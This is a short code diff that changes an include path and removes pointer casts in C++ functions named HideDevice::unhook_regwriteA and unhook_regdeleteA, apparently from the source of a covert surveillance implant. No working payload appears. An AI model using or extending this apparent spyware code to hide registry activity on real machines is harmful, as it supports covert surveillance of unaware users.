@@ -9,7 +9,7 @@
 #include "H4-DLL.h"
 #include "common.h"
 #include "HM_Reloc.h"
-#include "strings.h"
+#include <rcs/strings.h>
 
 #define STATUS_INFO_LENGTH_MISMATCH      ((NTSTATUS)0xC0000004L)
 #define STATUS_SUCCESS 0
@@ -447,8 +447,8 @@ BOOL HideDevice::unhook_regwriteA(char *value_name, char *value)
 	value_w = (WCHAR *)calloc((strlen(value)+1), sizeof(WCHAR));
 
 	if (value_name_w && value_w) {
-		HM_A2U(value_name, (char *)value_name_w);
-		HM_A2U(value, (char *)value_w);
+		HM_A2U(value_name, value_name_w);
+		HM_A2U(value, value_w);
 		ret_val = unhook_regwriteW(value_name_w, value_w);
 	}
 
@@ -505,7 +505,7 @@ BOOL HideDevice::unhook_regdeleteA(char *value_name)
 	value_name_w = (WCHAR *)calloc((strlen(value_name)+1), sizeof(WCHAR));
 
 	if (value_name_w) {
-		HM_A2U(value_name, (char *)value_name_w);
+		HM_A2U(value_name, value_name_w);
 		ret_val = unhook_regdeleteW(value_name_w);
 	}
 
